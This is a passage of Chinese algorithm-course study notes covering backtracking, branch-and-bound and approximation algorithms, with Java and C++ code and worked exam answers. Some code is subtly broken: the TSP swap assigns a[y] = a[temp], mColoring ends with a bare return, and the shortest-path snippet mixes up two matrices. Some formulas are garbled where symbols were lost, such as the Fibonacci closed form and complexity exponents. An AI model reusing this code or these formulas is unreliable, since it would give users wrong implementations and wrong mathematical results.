(不在同一斜线)\n​\t四皇后问题的解空间树是一棵完全4叉树，树的根结点表示搜索的初始状态，从根结点到第2层结点对应皇后1在棋盘中第1行的可能摆放位置，从第2层结点到第3层结点对应皇后2在棋盘中第2行的可能摆放位置，依此类推。\n4、算法实现 # public class nQueen { //n皇后问题 private int n;//皇后个数 private int[] x;//当前解 private long sum;//当前已找到可行方案数 public nQueen(int n){ this.n = n; this.sum = 0; this.x = new int[n+1]; for (int i = 0; i \u0026lt;=n ; i++) { x[i]=0; } this.backTrack(1); } /** * 放置在第k行 * * @param k * @return 是否可行 */ private boolean place(int k) { for (int i = 1; i \u0026lt; k; i++) { //前面有没有可能存在某一行在斜对角上产生冲突的状况 if (Math.abs(k - i) == Math.abs(x[k] - x[i]) || x[i] == x[k]) { // return false; } } return true; } /** * 递归回溯 * @param t */ public void backTrack(int t) { if (t \u0026gt; n) sum++; else for (int i = 1; i \u0026lt;= n; i++) {//[1:n]列 x[t] = i;//放在第i列 if (place(t)) backTrack(t + 1); } } } 优化：\nclass Solution { public List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; solveNQueens(int n) { List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; ans = new ArrayList\u0026lt;\u0026gt;(); int[] queens = new int[n]; // 皇后放在 (r,queens[r]) boolean[] col = new boolean[n]; boolean[] diag1 = new boolean[n * 2 - 1]; boolean[] diag2 = new boolean[n * 2 - 1]; dfs(0, queens, col, diag1, diag2, ans); return ans; } private void dfs(int r, int[] queens, boolean[] col, boolean[] diag1, boolean[] diag2, List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; ans) { int n = col.length; if (r == n) { List\u0026lt;String\u0026gt; board = new ArrayList\u0026lt;\u0026gt;(n); // 预分配空间 for (int c : queens) { char[] row = new char[n]; Arrays.fill(row, \u0026#39;.\u0026#39;); row[c] = \u0026#39;Q\u0026#39;; board.add(new String(row)); } ans.add(board); return; } // 在 (r,c) 放皇后 for (int c = 0; c \u0026lt; n; c++) { int rc = r - c + n - 1; if (!col[c] \u0026amp;\u0026amp; !diag1[r + c] \u0026amp;\u0026amp; !diag2[rc]) { // 判断能否放皇后 queens[r] = c; // 直接覆盖，无需恢复现场 col[c] = diag1[r + c] = diag2[rc] = true; // 皇后占用了 c 列和两条斜线 dfs(r + 1, queens, col, diag1, diag2, ans); col[c] = diag1[r + c] = diag2[rc] = false; // 恢复现场 } } } } 非递归的回溯方法：\n先暂时能看懂就行。\n/** * 非递归回溯 * * @param t */ public void backTrack_o(int t) { x[1] = 0; int k = 1; while (k \u0026gt; 0) { x[k] += 1; //第k行的放到下一列 //x[k]不能放置，则放到下一列，直到可放置 while ((x[k] \u0026lt;= n) \u0026amp;\u0026amp; !place(k)) x[k] += 1; if (x[k] \u0026lt;= n) //放在n列范围内 if (k == n) //已放n行 sum++; else //不足n行 { k++; //放下一行 x[k] = 0; //下一行又从第0列的下列开始试放 } else //第k行无法放置，则重新放置上一行（放到下一列） k--; } } 5.4 0-1背包问题(重点) # 1、算法描述 # 解空间：子集树\n0-1背包问题是子集选取问题，其解空间可用子集树表示。\n​\t可行性约束函数：∑𝑖=1𝑛𝑤𝑖𝑥𝑖≤𝑐1\n​\t上界约束：当右子树中有可能包含最优解时才进入右子树搜索，否则剪去右子树。\n​\t设r是当前剩余物品价值总和，cp是当前价值，bestp是当前最优价值，当cp+r≤bestp时，剪去右子树。\n​\t计算右子树中解的上界更好的方法是将剩余的物品依其单位重量价值排序，然后依次装入物品，直到装不下时，再装入该物品一部分而装满背包，由此得到的价值是右子树中解的上界。——将背包问题作为0-1背包问题的上界。\n2、算法实现 # template\u0026lt;typename Typew,typename Typep\u0026gt; class Knap { friend Typep Knapsack\u0026lt;\u0026gt;(Typep *,Typew *,Typew,int); //\u0026lt;\u0026gt;指明友员函数为模板函数 private: Typep Bound(int i); //计算上界 void Backtrack(int i); Typew c; //背包容量 int n; //物品数 Typew *w; //物品重量数组 Typep *p; //物品价值数组 Typew cw; //当前重量 Typep cp; //当前价值 Typep bestp; //当前最优价值 }; template\u0026lt;typename Typew,typename Typep\u0026gt; void Knap\u0026lt;Typew,Typep\u0026gt;::Backtrack(int i) //回溯 { if(i\u0026gt;n) { bestp=cp; return; } if(cw+w[i]\u0026lt;=c) //进入左子树 { cw+=w[i]; cp+=p[i]; Backtrack(i+1); cw-=w[i]; cp-=p[i]; } if(Bound(i+1)\u0026gt;bestp) //进入右子树 Backtrack(i+1); } template\u0026lt;typename Typew,typename Typep\u0026gt; Typep Knap\u0026lt;Typew,Typep\u0026gt;::Bound(int i) //计算上界 { Typew cleft=c-cw; //剩余的背包容量 Typep b=cp; //b为当前价值 while(i\u0026lt;=n\u0026amp;\u0026amp;w[i]\u0026lt;=cleft) //依次装入单位重量价值高的整个物品 { cleft-=w[i]; b+=p[i]; i++; } if(i\u0026lt;=n) //装入物品的一部分 b+=p[i]*cleft/w[i]; return b; //返回上界 } class Object //物品类 { friend int Knapsack(int *,int *,int,int); public: int operator \u0026lt;(Object a) const { return (d\u0026gt;a.d); } int ID; //物品编号 float d; //单位重量价值 }; template\u0026lt;typename Typew,typename Typep\u0026gt; Typep Knapsack(Typep p[],Typew w[],Typew c,int n) { Typew W=0; //总重量 Typep P=0; //总价值 Object* Q=new Object[n]; //创建物品数组，下标从0开始 for(int i=1;i\u0026lt;=n;i++) //初始物品数组数据 { Q[i-1].ID=i; Q[i-1].d=1.0*p[i]/w[i]; P+=p[i]; W+=w[i]; } if(W\u0026lt;=c) //能装入所有物品 return P; QuickSort(Q,0,n-1); //依物品单位重量价值非增排序 Knap\u0026lt;Typew,Typep\u0026gt; K; K.p=new Typep[n+1]; K.w=new Typew[n+1]; for(int i=1;i\u0026lt;=n;i++) { K.p[i]=p[Q[i-1].ID]; K.w[i]=w[Q[i-1].ID]; } K.cp=0; K.cw=0; K.c=c; K.n=n; K.bestp=0; K.Backtrack(1); delete[] Q; delete[] K.w; delete[] K.p; return K.bestp; } ​\t计算上界需要O(n)时间，最坏情况下有𝑂(2𝑛)个右儿子结点需要计算上界，故算法所需要的时间为𝑂(𝑛2𝑛)\n5.5 图的m着色问题 # 比较简单，主要就写一个判定函数检查颜色是否可用。\n1、问题描述 # ​\t给定无向连通图G和m种不同的颜色。用这些颜色为图G的各顶点着色，每个顶点着一种颜色。是否有一种着色法使G中每条边的2个顶点着不同颜色。\n​\t这个问题是图的m可着色判定问题。若一个图最少需要m种颜色才能使图中每条边连接的2个顶点着不同颜色，则称这个数m为该图的色数。求一个图的色数m的问题称为图的m可着色优化问题。\n2、算法设计 # 用图的邻接矩阵a表示无向连通图G。\n解向量：(x1, x2, … , xn)表示顶点i所着颜色x[i]\n可行性约束函数：顶点i与已着色的相邻顶点颜色不重复。\n注意解空间树的画法。\nclass Color { friend int mColoring(int,int,int **); private: bool OK(int k); //检查颜色是否可用 void Backtrack(int t); int n; //图的顶点数 int m; //可用颜色数 int **a; //图的邻接矩阵 int *x; //当前解 long sum; //当前已找到的可m着色方案数 }; bool Color::OK(int k) //检查顶点k颜色是否可用 { for(int j=1;j\u0026lt;=n;j++){ if((a[k][j]==1)\u0026amp;\u0026amp;(x[j]==x[k])) //有边相连且两顶点颜色相同 return false; } return true; } void Color::Backtrack(int t) { if(t\u0026gt;n) { sum++; for(int i=1;i\u0026lt;=n;i++) cout\u0026lt;\u0026lt;x[i]\u0026lt;\u0026lt;\u0026#39; \u0026#39;; cout\u0026lt;\u0026lt;endl; } else for(int i=1;i\u0026lt;=m;i++) //m种颜色 { x[t]=i; //顶点t使用颜色i if(OK(t)) Backtrack(t+1); x[t]=0; //恢复x[t]的初值 } } int mColoring(int n,int m,int **a) { Color X; //初始化X X.n=n; X.m=m; X.a=a; X.sum=0; int *p=new int[n+1]; for(int i=0;i\u0026lt;=n;i++) p[i]=0; X.x=p; X.Backtrack(1); delete[] p; return } 3、算法效率 # 时间耗费𝑂(𝑛𝑚𝑛)\n判断下图是否是3可着色\n尝试着画一下。\n5.6 TSP问题（旅行售货员问题）【一级重点】 # 本问题相当重要，务必吃透。\n1、算法描述 # 已给一个n个点的完全图，每条边都有一个长度，求总长度最短的经过每个顶点正好一次的封闭回路\n因为每两个节点之间都是可达的，那么就是一个排列树。\n解空间：排列树\n开始时x=[1,2,\u0026hellip;,n]，则相应的排列树由x[1:n]的所有排列构成。\n2、递归算法 # ​\t当i=n时，当前扩展结点是排列树的叶结点的父结点，此时检查图G是否存在一条从顶点x[n-1]到顶点x[n]的边和一条从顶点x[n]到顶点1的边，如果两条边都存在，则找到一条回路。再判断此回路的费用是否优于当前最优回路的费用，是则更新当前最优值和最优解。\n​\t当i\u0026lt;n时，当前扩展结点位于排列树的第i-1层。图G中存在从顶点x[i-1]到x[i]的边时，检查x[1:i]的费用是否小于当前最优值，是则进入排列树的第i层，否则剪去相应子树。\n3、算法实现 # public class TSP { /** * 已给一个n个点的[完全图])，每条边都有一个长度， * 求总长度最短的经过每个顶点正好一次的封闭回路 */ private int n;//图的顶点数 private int[] x;//当前解 private int[] bestx;//当前最优解 private int[][] a;//邻接矩阵 private int cc;//当前费用 private int bestc;//当前最优值 private static final int NO_EDGE = Integer.MAX_VALUE;//无边标记 public TSP(int[][] a, int[] v, int n) { this.a = a; this.n = n; this.bestx = v; this.x = new int[n + 1]; this.bestc=NO_EDGE; this.cc = 0; this.backTrack(2); } public void backTrack(int i) { // 什么时候收获结果？ if (i == n) { //当i=n时，当前扩展结点是排列树的叶结点的父结点，此时检查图G是否存在一条从 // 顶点x[n-1]到顶点x[n]的边和一条从顶点x[n]到顶点1的边，如果两条边都存在， // 则找到一条回路。再判断此回路的费用是否优于当前最优回路的费用，是则更新当前最优值和最优解。 if (a[x[n - 1]][x[n]] != NO_EDGE \u0026amp;\u0026amp; a[x[n]][1] != NO_EDGE \u0026amp;\u0026amp; (cc + a[x[n - 1]][x[n]] + a[x[n]][1] \u0026lt; bestc || bestc == NO_EDGE)) { for (int j = 1; j \u0026lt;= n; j++) { bestx[j] = x[j]; } bestc = cc + a[x[n - 1]][x[n]] + a[x[n]][1]; } } else { //当i\u0026lt;n时，当前扩展结点位于排列树的第i-1层。图G中存在从顶点x[i-1]到x[i]的边时， // 检查x[1:i]的费用是否小于当前最优值，是则进入排列树的第i层，否则剪去相应子树。 // 1.自己到自己节点在邻接矩阵中设置为无穷，肯定不会直接回去 // 2.也相当于是一种限制条件 for (int j = i; j \u0026lt;= n; j++) { if (a[x[i - 1]][x[j]] != NO_EDGE \u0026amp;\u0026amp; (cc + a[x[i - 1]][x[j]] \u0026lt; bestc || bestc == NO_EDGE)) { // 注意这里要先交换，i之前的就是我们选择走的路径，i之后的是我们没走过的路径。 swap(x,i,j); cc += a[x[i - 1]][x[i]]; backTrack(i + 1); cc -= a[x[i - 1]][x[i]]; swap(x,i,j); } } } } private void swap(int[]a, int x, int y) { int temp = a[x]; a[x] = a[y]; a[y] = a[temp]; } } 4、算法效率 # 这是排列树，就是O(n!)\n​\t算法backtrack在最坏情况下可能需要更新当前最优解O((n-1)!)次，每次更新bestx需计算时间O(n)，从而整个算法的计算时间复杂性为O(n!)。\n5.7 最大团问题 # 最大团问题 给定无向图G=(V，E)。如果UV，且对任意u，vU有 (u，v)E，则称U是G的完全子图。例如{1,2}。 G的完全子图U是G的团当且仅当U不包含在G的更大的完全 子图中，例如{1,2,5}。 G的最大团是指G中所含顶点数最多的团。\n找出一个图的最大团： 可看做图G的顶点集V的子集选取问题。 • 解空间：子集树 • 可行性约束函数：顶点i到已选入顶点集中的每一个顶点都有边相连。 •上界函数：有足够多的可选择顶点使得算法有可能在右子树中找到更大的团。\n代码：\nx[]保存了团内的节点。\na [ i ] [ j ] 是boolean数组，表示其中的两个点有没有相连接。\n​\t每到一个新的节点，遍历检查这个节点有没有和现存的团中的每一个节点相连接，连接了我们就要了这个节点，否则不要。\n6.分支限界法 # 注意这里的基本概念要点。\n6.1 分支限界法的基本思想 # 分支限界法和回溯法 # 区别是考试的重点。\n​\t求解目标：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。\n​\t搜索方式的不同：回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。\n仅从方式来看，这类似于层序遍历的过程。\n​\t在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。\n选择下一个E结点的方法如下：\n1）先进先出(FIFO)：从活结点表中取出结点的顺序与加入结点的顺序相同。\n​\t后进先出(LIFO)：从活结点表中取出结点的顺序与加入结点的顺序相反。\n2）优先队列式分支限界法\n​\t按照优先队列中规定的优先级选取优先级最高的节点成为当前扩展节点。\n​\t（就是Dijkstra的堆优化算法）\n基本思想 # 1️⃣ 在 e_结点估算沿着它的各儿子结点搜索时，目标函数可能取得的“界”，\n2️⃣ 把儿子结点和目标函数可能取得的“界”，保存在优先队列或堆中，\n3️⃣ 从队列或堆中选取“界”最大或最小的结点向下搜索，直到叶子结点，\n4️⃣ 若叶子结点的目标函数的值，是结点表中的最大值或最小值，则沿叶子结点到根结点的路径所确定的解，就是问题的最优解，否则转 3 继续搜索\n示例 # 0-1背包问题\n考虑实例n=4，w=[3,5,2,1]，v=[9,10,7,4]，C=7。\n定义问题的解空间\n该实例的解空间为（x1,x2,x3,x4），xi=0或1(i=1,2,3,4)。\n确定问题的解空间组织结构\n该实例的解空间是一棵子集树，深度为4。\n搜索解空间\n约束条件\n限界条件 cp+rp\u0026gt;bestp\n队列式分支限界法 # cp初始值为0；rp初始值为所有物品的价值之和；bestp表示当前最优解，初始值为0。\n当cp\u0026gt;bestp时，更新bestp为cp。\n理解下面的图：这样的过程就是类似于层序遍历生成一颗树。\n优先队列式 # ​\t优先级：活结点代表的部分解所描述的装入背包的物品价值上界，该价值上界越大，优先级越高。活结点的价值上界up=cp+rp。\n约束条件：同队列式\n限界条件：up=cp+r‘p\u0026gt;bestp。\nrp 剩余物品装满背包的价值\n优先去装原来价值就更大的背包。\n6.2 单源最短路径问题 # 问题描述 # 在下图所给的有向图G中，每一边都有一个非负边权。要求图G的从源顶点s到目标顶点t之间的最短路径。\n下图是用优先队列式分支限界法解有向图G的单源最短路径问题产生的解空间树。其中，每一个结点旁边的数字表示该结点所对应的当前路长。\n算法思想 # ​\t解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。\n​\t算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。\n​\t如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。\n实例说明 # 算法设计 # static float[][]a //图G的邻接矩阵 static float []dist //源到各顶点的距离 static int []p //源到各顶点的路径上的前驱顶点 HeapNode //最小堆元素 { int i; //顶点编号 float length;//当前路长 …… } //1.先进行一个while(true)的循环。 while (true) {//搜索问题的解空间 //2.取堆的最上面的节点出来并且对于每个点都进行一次遍历和更新。 for (int j = 1; j \u0026lt;= n; j++) //3.如果满足条件的话就更改值并且加入优先队列。 if ((a[enode.i][j]\u0026lt;Float.MAX_VALUE)\u0026amp;\u0026amp; (enode.length+a[enode.i][j]\u0026lt;dist[j])) {//顶点i和j间有边，且此路径长小于原先从原点到j的路径长 // 顶点i到顶点j可达，且满足控制约束 dist[j]= enode.length+c[enode.i][j]; p [j]= enode.i; // 加入活结点优先队列 HeapNode node=new HeapNode(j,dist[j]); heap.put(node); } // 取下一扩展结点 if ( heap.isEmpty( ) ) break; else enode=(HeapNode)heap.removeMin(); } } 6.3 0-1背包问题[重点] # 解答参考https://www.it610.com/article/1296236014334976000.htm\n问题描述 # 给定n种物品和一个背包。物品i的重量是wi，其价值为vi，背包的容量为c。 应如何选择装入背包的物品，使得装入背包中物品的总价值最大? 在选择装入背包的物品时，对每种物品i只有2种选择，即装入背包或不装入背包。不能将物品i装入背包多次，也不能只装入部分的物品i。 算法的思想 # 首先，要对输入数据进行预处理，将各物品依其单位重量价值从大到小进行排列。 在实现时，由Bound计算当前结点处的上界。在解空间树的当前扩展结点处，仅当要进入右子树时才计算右子树的上界Bound，以判断是否将右子树剪。进入左子树时不需要计算上界，因为其上界与其父节点上界相同。 在优先队列分支限界法中，结点的优先级定义为：以结点的价值上界作为优先级（由bound函数计算出） 步骤 # 就是使用队列的同时还加上了附加条件。\n算法首先根据基于可行结点相应的子树最大价值上界优先级，从堆中选择一个节点（根节点）作为当前可扩展结点。 检查当前扩展结点的左儿子结点的可行性。 如果左儿子结点是可行结点，则将它加入到子集树和活结点优先队列中。 当前扩展结点的右儿子结点一定是可行结点，仅当右儿子结点满足上界函数约束时,才将它加入子集树和活结点优先队列。 当扩展到叶节点时，算法结束，叶子节点对应的解即为问题的最优值。 样例 # 假设有4个物品，其重量分别为(4, 7, 5, 3)，价值分别为(40, 42, 25, 12)，背包容量W=10。将给定物品按单位重量价值从大到小排序，结果如下：\n物品 重量(w) 价值(v) 价值/重量(v/w) 1 4 40 10 2 7 42 6 3 5 25 5 4 3 12 4 上界计算 先装入物品1，剩余的背包容量为6，只能装入物品2的6/7(即42*(6/7)=36)。 即上界为40+6*6=76\n已第一个up为例:40+6*(10-4)=76 打x的部分因为up值已经小于等于bestp了，所以没必要继续递归了。\n核心代码 # Typew c： 背包容量 C： 背包容量 Typew *w： 物品重量数组 Typew *p： 物品价值数组 Typew cw：当前重量 Typew cp：当前价值 Typep bestcp：当前最优价值 上界函数 # 这和贪心算法有什么区别？\ntemplate\u0026lt;class Typew, class Typep\u0026gt; Typep Knap\u0026lt;Typew, Typep\u0026gt;::Bound(int i) {// 计算上界 Typew cleft = c - cw; // 剩余容量 Typep b = cp; // 以剩余物品单位重量价值递减序装入物品 while (i \u0026lt;= n \u0026amp;\u0026amp; w[i] \u0026lt;= cleft) { cleft -= w[i]; b += p[i]; i++; } // 装满背包 if (i \u0026lt;= n) b += p[i]/w[i] * cleft; return b; } 结点定义 # static class Bbnode{ BBnode parent; //父结点 boolean leftChild; //左儿子结点标志 …} static class HeapNode implements Comparable{ BBnode liveNode; //活结点 double upperProfit; //结点的价值上界 double profit; //结点所相应的价值 double weight; //结点所相应的重量 int level; //活结点在子集树中所处的层序号 } 0-1背包问题优先队列分支限界搜索算法 # 6.4 作业分配问题【重点,没看懂】 # 详情参考https://blog.csdn.net/qq_40801709/article/details/90439784\n1、问题描述 # ​\tn 个操作员以 n 种不同时间完成 n 种不同作业。要求分配每位操作员完成一项工作，使完成 n 项工作的总时间最少操作员编号为 0,1,…n-1，作业也编号为 0,1,…n-1， 矩阵 c 描述每位操作员完成每个作业时所需的时间，元素 ci,j 表示第 i 位操作员完成第 j 号作业所需的时间 向量 x 描述分配给操作员的作业编号，分量 xi 表示分配给第 i 位操作员的作业编号。\n2、思想方法 # 1）从根结点开始，每遇到一个扩展结点，就对它的所有儿子结点计算其下界，把它们登记在结点表中。\n2）从表中选取下界最小的结点，重复上述过程。\n3）当搜索到一个叶子结点时，如果该结点的下界是结点表中最小的，那么，该结点就是问题的最优解。\n4）否则，对下界最小的结点继续进行扩展\n3、下界的确认 # 搜索深度为 0 时，把第 0 号作业分配给第 i 位操作员所需时间至少为第 i 位操作员完成第 0 号作业所需时间，加上其余 n-1个作业分别由其余 n-1 位操作员单独完成时所需最短时间之和，有： 例：4个操作员完成4个作业所需的时间表如下：\n​\t把第 0 号作业分配给第 0 位操作员时，所需时间至少不小于 3 + 7 + 6 + 3 = 19 ，把0号作业1 位操作员时，所需 时间至少不会小于9+7+4+3…\n​\t搜索深度为 k 时，前面第0,1,\u0026hellip;\u0026hellip;,k-1号作业已分别分配 给编号为i0,i1,\u0026hellip;\u0026hellip;,ik-1的操作员。 S={0,1,\u0026hellip;\u0026hellip;,n-1}表示所有操作员的编号集合；\nmk-1={i0,i1,\u0026hellip;\u0026hellip;ik-1}表示作业已分配的操作员编号集合。当把第k号作业分配给编号为ik的操作员时，𝑖𝑘∈𝑆−𝑚𝑘−1， 所需时间至少为：\n​ 则上式为把第k号作业分配给编号为ik的操作员时的下界\n4、算法实现步骤 # 5、实现代码 # #include\u0026lt;iostream\u0026gt; using namespace std; #define MAX_NUM 99999 const int n = 4; float c[n][n];//n个操作员分别完成n项作业所需时间 float bound = MAX_NUM;//当前已搜索可行解的最优时间 struct ass_node { int x[n];//分配给操作员的作业 int k;//搜索深度 float t;//当前搜索深度下，已分配作业所需时间 float b;//本节点所需的时间下界 struct ass_node* next;//优先队列链指针 }; typedef struct ass_node* ASS_NODE; //把xnode所指向的节点按所需时间下界插入优先队列qbase中，下界越小，优先性越高 void Q_insert(ASS_NODE qbase, ASS_NODE xnode) { ASS_NODE temp = qbase-\u0026gt;next; ASS_NODE temp2 = qbase; while (temp != NULL) { if (xnode-\u0026gt;b \u0026lt; temp-\u0026gt;b) { break; } temp2 = temp; temp = temp-\u0026gt;next; } xnode-\u0026gt;next = temp2-\u0026gt;next; temp2-\u0026gt;next = xnode; } //取下并返回优先队列qbase的首元素 ASS_NODE Q_delete(ASS_NODE qbase) { //ASS_NODE temp = qbase; ASS_NODE rt = new ass_node;//只是一个node if (qbase-\u0026gt;next != NULL) *rt = *qbase-\u0026gt;next; else rt = NULL; qbase-\u0026gt;next = qbase-\u0026gt;next-\u0026gt;next; return rt; } //分支限界法实现 float job_assigned(float (*c)[n], int n, int* job) { int i, j, m; ASS_NODE xnode,ynode=NULL; ASS_NODE qbase = new ass_node; qbase-\u0026gt;next = NULL; qbase-\u0026gt;b = 0;//空头节点 float min, bound = MAX_NUM; xnode = new ass_node; for (i = 0;i \u0026lt; n;i++) xnode-\u0026gt;x[i] = -1;//-1表示尚未分配 xnode-\u0026gt;t = xnode-\u0026gt;b = 0; xnode-\u0026gt;k = 0; //非叶子节点，继续向下搜索 while (xnode-\u0026gt;k != n) { //对n个操作员分别判断处理 for (i = 0;i \u0026lt; n;i++) { if (xnode-\u0026gt;x[i] == -1) {//i操作员未分配工作 ynode = new ass_node;//为i操作员建立一个节点 *ynode = *xnode;//把父节点数据复制给它 ynode-\u0026gt;x[i] = ynode-\u0026gt;k;//作业k分配给操作员i ynode-\u0026gt;t += c[i][ynode-\u0026gt;k];//已分配作业累计时间 ynode-\u0026gt;b = ynode-\u0026gt;t; ynode-\u0026gt;k++;//该节点下一次搜索深度 ynode-\u0026gt;next = NULL; for (j = ynode-\u0026gt;k;j \u0026lt; n;j++) {//未分配作业最小时间估计 min = MAX_NUM; for (m = 0;m \u0026lt; n;m++) { if ((ynode-\u0026gt;x[m] == -1) \u0026amp;\u0026amp; c[m][j] \u0026lt; min) min = c[m][j]; } ynode-\u0026gt;b += min;//本节点所需时间下界 } if (ynode-\u0026gt;b \u0026lt; bound) { Q_insert(qbase, ynode);//把节点插入优先队列 if (ynode-\u0026gt;k == n)//得到一个可行解 bound = ynode-\u0026gt;b;//更新可行解的最优下界 } else delete ynode;//大于可行解最优下界 } } delete xnode;//释放节点xnode的缓冲区 xnode = Q_delete(qbase);//取下队列首元素xnode } min = xnode-\u0026gt;b; for (i = 0;i \u0026lt; n;i++)//保存最优方案 job[i] = xnode-\u0026gt;x[i]; while (qbase-\u0026gt;next) { xnode = Q_delete(qbase); delete xnode; } return min; } int main() { c[0][0] = 3;c[0][1] = 8;c[0][2] = 4;c[0][3] = 12; c[1][0] = 9;c[1][1] = 12;c[1][2] = 13;c[1][3] = 5; c[2][0] = 8;c[2][1] = 7;c[2][2] = 9;c[2][3] = 3; c[3][0] = 12;c[3][1] = 7;c[3][2] = 6;c[3][3] = 8; int* job = new int[n]; for (int i = 0;i \u0026lt; n;i++) job[i] = -1; float result = job_assigned(c, n, job); for (int i = 0;i \u0026lt; n;i++) cout \u0026lt;\u0026lt; job[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; result \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 近似算法 # 顶点覆盖问题的近似算法 # VertexSet approxVertexCover ( Graph g ){ cset= 空集 e1=g.e; while (e1 != null) 从e1中任取一条边(u,v)； cset=cset∪{u,v}； 从e1中删去与u和v相关联的所有边； return cset; } 过程：\n到C的位置的时候，e1中已经没有边了，循环结束。\n比较简单的证明，性能比\u0026lt;=2。\n◼每条边扫描一次，时间复杂度为O(|E|) ◼Ratio Bound为2。证明如下： ❑令E’为选中的边集，若(u,v)∈ E’，则与其相邻的边都被删除，因此E’中无相邻边; ❑每次选一条边，则每次有两个顶点加入解集A，|A|=2|E’|; ❑设OPT为最优解，由于E’中无邻接边，OPT至少包含E’中每条边的一个顶点，故|E’|≤|OPT|; ❑故|A|=2|E’|≤2|OPT|，从而得性能比 |A|/|OPT|≤2。\n一些题目解答 # 1.什么是复杂性和渐进复杂性？ 计算资源的量 n趋近于无穷的渐进函数\n2.回溯法的约束函数和限界函数是干什么的？ 不满足约束条件 不满足最优解\n3.最优子结构？\n4.什么是算法？\n注意16和17的证明。\n解决问题的方法或者过程，满足有限性，确定性，可行性。\n递归分治1 # 1️⃣第一问\n第一次：将全体分成9/9/9分别称重，找出较轻的一份 第二次：将较轻的一份成3/3/3，找出较轻的一份 第三次：将较轻的一份成1/1/1，就此找出轻硬币 2️⃣第二问\n算法设计：将3𝑘分为3×3𝑘−1后找出较轻者，再将3𝑘−1分为3×3𝑘−2后找出较轻者，递归至最终只有一个硬币 递归表达式：𝑇(𝑛)=𝑇(𝑛3)+𝑂(1) T ( n ) ：原问题的规模 O ( 1 ) ：找出三者中哪个最轻 T (n3) ：分组后需要处理的那1/3份问题的规模 复杂度：由主定理直接得𝑛log𝑏⁡𝑎=1与𝑂(1)增长速度一样，所以𝑇(𝑛)=Θ(𝑛log𝑏⁡𝑎log⁡𝑛)=log⁡𝑛 ⚠️主定理：𝑇(𝑛)=𝑎𝑇(𝑛𝑏)+𝑓(𝑛)，则𝑇(𝑛)有如下渐进界\n条件 结论 f ( n ) 的增长慢于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( n log b ⁡ a ) f ( n ) 的增长等于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( n log b ⁡ a log ⁡ n ) f ( n ) 的增长快于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( f ( n ) ) 递归分治2 # int f(int n) { if (n \u0026lt;= 1) return 1; return f(n-1)+f(n-2); } 1️⃣第一问：设𝑓(𝑛)问题中调用了𝑎(𝑛)次𝑓(0)，调用了𝑏(𝑛)次𝑓(1)\n递归条件： f ( n ) 本质上就是一堆𝑓(0)/𝑓(1)的相加 在𝑓(𝑛)中调用𝑓(0)/𝑓(1)的次数，就是在𝑓(𝑛–1)和𝑓(𝑛–2)中调用𝑓(0)/𝑓(1)的次数的总和 a ( n ) = a ( n – 1 ) + a ( n – 2 ) 以及𝑏(𝑛)=𝑏(𝑛–1)+𝑏(𝑛–2)，二者就是一个斐波那契数列 尝试前面几个值： f ( 0 ) = 1 直接返回自身的值，算是调用了𝑓(0)一次，所以𝑎(0)=1/𝑏(0)=0 f ( 1 ) = 1 直接返回自身的值，算是调用了𝑓(1)一次，所以𝑎(1)=0/𝑏(1)=1 前两项相加𝑓(2)=2/𝑎(2)=1/𝑏(2)=1 前两项相加𝑓(3)=3/𝑎(3)=1/𝑏(3)=2 前两项相加𝑓(4)=5/𝑎(4)=2/𝑏(4)=3 前两项相加𝑓(5)=8/𝑎(5)=3/𝑏(5)=5 可知𝑎(𝑛)比𝑓(𝑛)慢了两步所以𝑎(𝑛)=𝑓(𝑛–2)，𝑏(𝑛)比𝑓(𝑛)慢了一步所以𝑏(𝑛)=𝑓(𝑛–1) 2️⃣第二问\n将规模为𝑛的wenti分解为：规模为𝑛–1的问题+规模为𝑛–2的问题+常数时间合并 所以𝑇(𝑛)=𝑇(𝑛–1)+𝑇(𝑛–2)+𝑂(1) 这个递归式很难解也不用解，因为题目已经告诉你了𝑓(n)=15((1+52)𝑛+1–(1–52)𝑛+1) 所以复杂度为𝑂(𝑓(𝑛))=𝑂(15((1+52)𝑛+1–(1–52)𝑛+1))=𝑂((1+52)𝑛+1) 递归分治3 # 1️⃣算法设计：将𝐴分为两部分，如果A[mid]\u0026gt;mid则查找左半边，如果A[mid]\u0026lt;mid则查找右半边，如此递归\n2️⃣复杂度：递归表达式𝑇(𝑛)=𝑇(𝑛2)+𝑂(1)，其中𝑂(1)为比较中值大小耗时\n由此𝑛log𝑏⁡𝑎=1，所以属于主定理的情况二，复杂度为Θ(log⁡𝑛) 1️⃣是什么：给定𝑛种物品和容量为𝐶的背包，物品𝑖的重量为𝑤𝑖价格为𝑣𝑖，如何装物品进去使得背包中物品最贵\n要求：max∑𝑖=1𝑛𝑣𝑖𝑥𝑖 限制：∑𝑖=1𝑛𝑤𝑖𝑥𝑖≤𝐶，其中𝑥𝑖∈0,1用于表示物品𝑖装还是不装，并且1≤𝑖≤𝑛 3️⃣递归结构：𝑚(𝑖,𝑗)=max𝑚(𝑖+1,𝑗–𝑤𝑖)+𝑣𝑖,𝑚(𝑖+1,𝑗)\nj 为当前剩余容量，𝑖表示当前当前正在处理物品𝑖，𝑚是背包已放入物体1→𝑖的价值 